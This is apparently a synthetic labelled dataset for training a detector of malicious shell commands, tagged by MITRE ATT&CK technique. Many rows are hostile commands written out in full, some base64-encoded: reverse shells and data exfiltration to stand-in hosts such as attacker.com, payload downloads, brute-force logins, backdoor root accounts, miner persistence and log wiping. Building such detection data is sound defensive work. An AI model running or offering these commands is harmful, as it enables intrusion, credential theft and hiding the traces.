echo 'R2V0LUxvY2FsR3JvdXBNZW1iZXIgLUdyb3VwIEFkbWluaXN0cmF0b3Jz' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1069_Permission_Groups_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
nmap -sn 192.168.1.0/24,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.12, 0, 0]",['T1018_Remote_System_Discovery'],synthetic
"bash -c ""route -n""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1016_System_Network_Config_Discovery'],synthetic
ncrack -p 22 --user root -P pass.lst 10.0.0.1 && echo done,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.44, 1, 0]","['T1110_Brute_Force', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"bash -c ""cat /etc/hostname""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['BENIGN'],synthetic
"bash -c ""> ~/.bash_history && history -c""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.28, 1, 0]",['T1070_Indicator_Removal'],synthetic
"nmap -sV -p 22,80,443 10.0.0.0/24","[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.2, 0, 0]",['T1018_Remote_System_Discovery'],synthetic
nohup wget http://attacker.com/payload -O /tmp/payload &,"[0, 1, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
"bash -c ""echo 'c2ggLWMgJ2N1cmwgaHR0cDovL2V2aWwuY29tL3NoZWxsLnNoIHwgYmFzaCc=' | base64 -d | bash""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
nohup getent passwd | awk -F: '$3 >= 1000' &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.4, 1, 0]",['T1033_System_Owner_Discovery'],synthetic
su -s /bin/bash www-data ; history -c,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.28, 1, 0]","['T1078_Valid_Accounts', 'T1059_Command_and_Scripting_Interpreter']",synthetic
time nmap -sn 192.168.1.0/24 ; echo done,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.28, 1, 0]","['T1018_Remote_System_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
id -Gn,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.08, 0, 0]",['T1069_Permission_Groups_Discovery'],synthetic
awk -F: '{print $1}' /etc/passwd | head -5,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]",['BENIGN'],synthetic
for i in $(seq 1 254); do ping -c1 -W1 192.168.0.$i &>/dev/null && echo 192.168.0.$i; done,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.64, 1, 0]",['T1018_Remote_System_Discovery'],synthetic
net user /domain,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1087_Account_Discovery'],synthetic
cat ~/.ssh/id_rsa,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1003_OS_Credential_Dumping'],synthetic
chmod 644 /etc/hosts,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
sudo ip neigh show,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1016_System_Network_Config_Discovery'],synthetic
echo 'Z2V0ZW50IHBhc3N3ZCB8IGdyZXAgLXYgbm9sb2dpbg==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1087_Account_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
find /home -name '.env' 2>/dev/null,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.2, 0, 0]",['T1083_File_and_Directory_Discovery'],synthetic
crontab -e | sleep 1,"[0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.2, 1, 0]","['T1053_Scheduled_Task', 'T1059_Command_and_Scripting_Interpreter']",synthetic
useradd -m -s /bin/bash hacker,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1136_Create_Account'],synthetic
sudo cat /etc/shadow | nc 10.0.0.99 4444,"[1, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.28, 1, 0]",['T1041_Exfiltration_Over_C2_Channel'],synthetic
"bash -c ""echo 'ZmluZCAvIC1uYW1lICcqLmNvbmYnIC1yZWFkYWJsZSAyPi9kZXYvbnVsbCB8IGhlYWQgLTIw' | base64 -d | bash""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1083_File_and_Directory_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
curl -A 'Mozilla/5.0' http://c2.attacker.com/check-in,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1071_Application_Layer_Protocol'],synthetic
"bash -c ""reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Defender""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1112_Modify_Registry'],synthetic
time echo 'dW5hbWUgLWE=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1082_System_Information_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
groups $(whoami),"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1069_Permission_Groups_Discovery'],synthetic
ip route show ; history -c,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.24, 1, 0]","['T1016_System_Network_Config_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
cat /proc/version,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1082_System_Information_Discovery'],synthetic
"python3 -c ""import urllib.request; urllib.request.urlretrieve('http://evil.com/payload', '/tmp/payload')""","[0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
sudo echo 'PiB+Ly5iYXNoX2hpc3RvcnkgJiYgaGlzdG9yeSAtYw==' | base64 -d | bash,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1070_Indicator_Removal', 'T1027_Obfuscated_Files_or_Information']",synthetic
time echo 'aGVsbG8=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
sudo echo 'aGVsbG8=' | base64 -d | bash,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
echo 'bmMgLWUgL2Jpbi9iYXNoIGF0dGFja2VyLmNvbSA4MCAmJiBoaXN0b3J5IC1j' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1071_Application_Layer_Protocol', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
find / -perm -4000 -type f 2>/dev/null,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.28, 0, 0]",['T1083_File_and_Directory_Discovery'],synthetic
echo 'Z2NjIGV4cGxvaXQuYyAtbyBleHBsb2l0ICYmIC4vZXhwbG9pdA==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1068_Exploitation_for_Privilege_Escalation', 'T1027_Obfuscated_Files_or_Information']",synthetic
w ; chmod +x /tmp/payload,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 1, 1]","['T1033_System_Owner_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
sudo echo -e '\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68',"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
find / -name '*.pem' 2>/dev/null,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.2, 0, 0]",['T1003_OS_Credential_Dumping'],synthetic
"sudo perl -e 'eval pack q/H*/, q/7363726970742e6570732f52656d6f74652e706e67/'","[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
time echo 'ZWNobyAnJyA+IC92YXIvbG9nL3N5c2xvZyB8IGVjaG8gZG9uZQ==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1070_Indicator_Removal', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
time ssh admin@localhost | > /dev/null 2>&1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.2, 0.28, 1, 0]","['T1078_Valid_Accounts', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nmap --script=vuln 10.0.0.1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.12, 0, 0]",['T1046_Network_Service_Scanning'],synthetic
dmesg | head -20,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.16, 1, 0]",['T1082_System_Information_Discovery'],synthetic
arp -a,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.08, 0, 0]",['T1016_System_Network_Config_Discovery'],synthetic
for p in $(cat passwords.txt); do sshpass -p $p ssh root@10.0.0.1 id; done,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.52, 0, 0]",['T1110_Brute_Force'],synthetic
echo 'Y2F0IH4vLnNzaC9pZF9yc2EgOyBlY2hvIGRvbmU=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1003_OS_Credential_Dumping', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
"bash -c ""dmidecode -t system && sleep 1""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 1, 0]","['T1082_System_Information_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
wmiexec.py domain/admin:pass@10.0.0.5,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1021_Remote_Services'],synthetic
sudo masscan -p1-65535 10.0.0.0/24 --rate=1000,"[1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.2, 0, 0]",['T1046_Network_Service_Scanning'],synthetic
echo  'backdoor:x:0:0:root:/root:/bin/bash'  >>  /etc/passwd,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1098_Account_Manipulation'],synthetic
echo 'dXNlcmFkZCAtbyAtdSAwIC1nIDAgLU0gLWQgL3Jvb3QgLXMgL2Jpbi9iYXNoIGdob3N0' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1136_Create_Account', 'T1027_Obfuscated_Files_or_Information']",synthetic
"time php -r '$sock=fsockopen(""10.0.0.99"",4444); ...'","[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
"bash -c ""perl -e 'eval pack q/H*/, q/7363726970742e6570732f52656d6f74652e706e67/'""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.0, 0.32, 0, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
"bash -c ""curl -s http://c2.attacker.com/beacon""","[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1041_Exfiltration_Over_C2_Channel'],synthetic
passwd -d root,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1098_Account_Manipulation'],synthetic
nmap --script=vuln 10.0.0.1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.12, 0, 0]",['T1046_Network_Service_Scanning'],synthetic
echo 'bG4gLXMgL3RtcC9iYWNrZG9vci5zaCAvZXRjL2Nyb24uZC9zeXN0ZW0tdXBkYXRl' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1053_Scheduled_Task', 'T1027_Obfuscated_Files_or_Information']",synthetic
time tftp -i 10.0.0.99 GET payload.exe C:\Windows\Temp\payload.exe && sleep 1,"[1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.4, 1, 0]","['T1105_Ingress_Tool_Transfer', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"python3 -c 'import socket,subprocess,os;...'","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
sudo for p in $(cat passwords.txt); do sshpass -p $p ssh root@10.0.0.1 id; done,"[1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.56, 0, 0]",['T1110_Brute_Force'],synthetic
"sudo nmap -sV -p 22,80,443 10.0.0.0/24","[1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.24, 0, 0]",['T1018_Remote_System_Discovery'],synthetic
psexec.py Administrator:password@10.0.0.5 cmd.exe,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1021_Remote_Services'],synthetic
dmidecode -t system,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1082_System_Information_Discovery'],synthetic
nohup su -s /bin/bash www-data &,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1078_Valid_Accounts'],synthetic
echo 'bWVkdXNhIC1oIDEwLjAuMC4xIC11IHJvb3QgLVAgL3RtcC9wYXNzd29yZHMudHh0IC1NIHNzaCB8IHNsZWVwIDE=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1110_Brute_Force', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
useradd -o -u 0 -g 0 -M -d /root -s /bin/bash ghost,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.48, 0, 0]",['T1136_Create_Account'],synthetic
(crontab -l; echo '* * * * * /tmp/payload.sh') | crontab -,"[0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.48, 1, 0]",['T1053_Scheduled_Task'],synthetic
echo 'Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAtdiBub2xvZ2luIHwgZ3JlcCAtdiBmYWxzZQ==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1033_System_Owner_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
./CVE-2021-4034,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.04, 0, 1]",['T1068_Exploitation_for_Privilege_Escalation'],synthetic
echo 'ZWNobyAnQHJlYm9vdCAvdG1wLy54bXIveG1yaWcgLW8gcG9vbC5taW5leG1yLmNvbScgfCBjcm9udGFiIC0=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1496_Resource_Hijacking', 'T1027_Obfuscated_Files_or_Information']",synthetic
service apache2 status,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
last -n 10 ; sleep 1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 1, 0]","['T1033_System_Owner_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"bash -c ""nc -zv 10.0.0.1 1-1000 2>&1 | grep succeeded""","[1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.4, 1, 0]",['T1046_Network_Service_Scanning'],synthetic
$env:cmd  =  [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')),"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
echo '@reboot /tmp/backdoor.sh' | crontab -,"[0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]",['T1053_Scheduled_Task'],synthetic
awk -F: '{print $1}' /etc/passwd | head -5,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]",['BENIGN'],synthetic
time wmic useraccount list,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1087_Account_Discovery'],synthetic
ncrack -p 22 --user root -P pass.lst 10.0.0.1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 0, 0]",['T1110_Brute_Force'],synthetic
nbtscan 192.168.1.0/24,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1018_Remote_System_Discovery'],synthetic
adduser --shell /bin/bash --disabled-password backdoor,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1136_Create_Account'],synthetic
at now + 1 minute <<< '/tmp/payload',"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1053_Scheduled_Task'],synthetic
time rm -rf /tmp/* /var/tmp/*,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1070_Indicator_Removal'],synthetic
echo  -e  '\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68'  &&  sleep  1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0.0, 0.24, 1, 0]","['T1027_Obfuscated_Files_or_Information', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'ZWNobyAnY29tcHJvbWlzZWQgQUxMPShBTEwpIE5PUEFTU1dEOkFMTCcgPj4gL2V0Yy9zdWRvZXJz' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1098_Account_Manipulation', 'T1027_Obfuscated_Files_or_Information']",synthetic
time wget -q http://miner.com/xmrig -O /tmp/xmr && chmod +x /tmp/xmr && /tmp/xmr -o pool.minexmr.com:443,"[0, 1, 1, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.56, 1, 1]",['T1496_Resource_Hijacking'],synthetic
echo  'Y2F0IC9ldGMvc2hhZG93IHwgbmMgMTAuMC4wLjk5IDQ0NDQ='  |  base64  -d  |  bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1041_Exfiltration_Over_C2_Channel', 'T1027_Obfuscated_Files_or_Information']",synthetic
time wget -q -O- --header='X-Auth: token123' http://evil.com/cmd ; chmod +x /tmp/payload,"[0, 1, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.44, 1, 1]","['T1071_Application_Layer_Protocol', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nohup nc -e /bin/bash attacker.com 80 &,"[0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1071_Application_Layer_Protocol'],synthetic
"bash -c ""find / -writable -type d 2>/dev/null""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.32, 0, 0]",['T1083_File_and_Directory_Discovery'],synthetic
cat  /etc/resolv.conf  |  >  /dev/null  2>&1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.2, 0.24, 1, 0]","['T1016_System_Network_Config_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nmap -A -T4 192.168.1.0/24,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.16, 0, 0]",['T1046_Network_Service_Scanning'],synthetic
nohup echo 'cmVnIGRlbGV0ZSBIS0xNXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1biAvdiBEZWZlbmRlciA7IGhpc3RvcnkgLWM=' | base64 -d | bash &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1112_Modify_Registry', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
wmiexec.py domain/admin:pass@10.0.0.5,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1021_Remote_Services'],synthetic
nohup curl -A 'Mozilla/5.0' http://c2.attacker.com/check-in &,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1071_Application_Layer_Protocol'],synthetic
time cat /etc/passwd | grep -v nologin | grep -v false,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.4, 0.44, 1, 0]",['T1033_System_Owner_Discovery'],synthetic
sudo echo 'bmV0IGxvY2FsZ3JvdXAgYWRtaW5pc3RyYXRvcnMgJiYgPiAvZGV2L251bGwgMj4mMQ==' | base64 -d | bash,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1069_Permission_Groups_Discovery', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
"bash -c ""nmap -sV -p 22,80,443 10.0.0.0/24 ; history -c""","[1, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0.0, 0.4, 1, 0]","['T1018_Remote_System_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
sudo echo 'aHlkcmEgLWwgYWRtaW4gLVAgL3Vzci9zaGFyZS93b3JkbGlzdHMvcm9ja3lvdS50eHQgc3NoOi8vMTAuMC4wLjE=' | base64 -d | bash,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1110_Brute_Force', 'T1027_Obfuscated_Files_or_Information']",synthetic
pip  install  requests,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
nohup openssl rand -hex 16 &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['BENIGN'],synthetic
echo -e '\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
time id | chmod +x /tmp/payload,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0.2, 0.24, 1, 1]","['T1033_System_Owner_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
wmiexec.py domain/admin:pass@10.0.0.5,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1021_Remote_Services'],synthetic
New-ItemProperty -Path 'HKLM:\...' -Name Persist -Value 'C:\payload.exe',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1112_Modify_Registry'],synthetic
$env:cmd  =  [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')),"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
strings /proc/*/mem | grep -i password,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]",['T1003_OS_Credential_Dumping'],synthetic
echo 'bmV0IGxvY2FsZ3JvdXAgYWRtaW5pc3RyYXRvcnMgOyBlY2hvIGRvbmU=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1069_Permission_Groups_Discovery', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
sudo echo '' > /var/log/syslog,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1070_Indicator_Removal'],synthetic
echo '@reboot /tmp/.xmr/xmrig -o pool.minexmr.com' | crontab -,"[0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]",['T1496_Resource_Hijacking'],synthetic
find /var/log -name '*.log' -exec truncate -s 0 {} \;,"[0, 0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.4, 0, 0]",['T1070_Indicator_Removal'],synthetic
time echo '@reboot /tmp/backdoor.sh' | crontab -,"[0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.28, 1, 0]",['T1053_Scheduled_Task'],synthetic
"perl -e 'eval pack q/H*/, q/7363726970742e6570732f52656d6f74652e706e67/'","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
echo 'cmVnIGRlbGV0ZSBIS0xNXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1biAvdiBEZWZlbmRlciAmJiBjaG1vZCAreCAvdG1wL3BheWxvYWQ=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1112_Modify_Registry', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
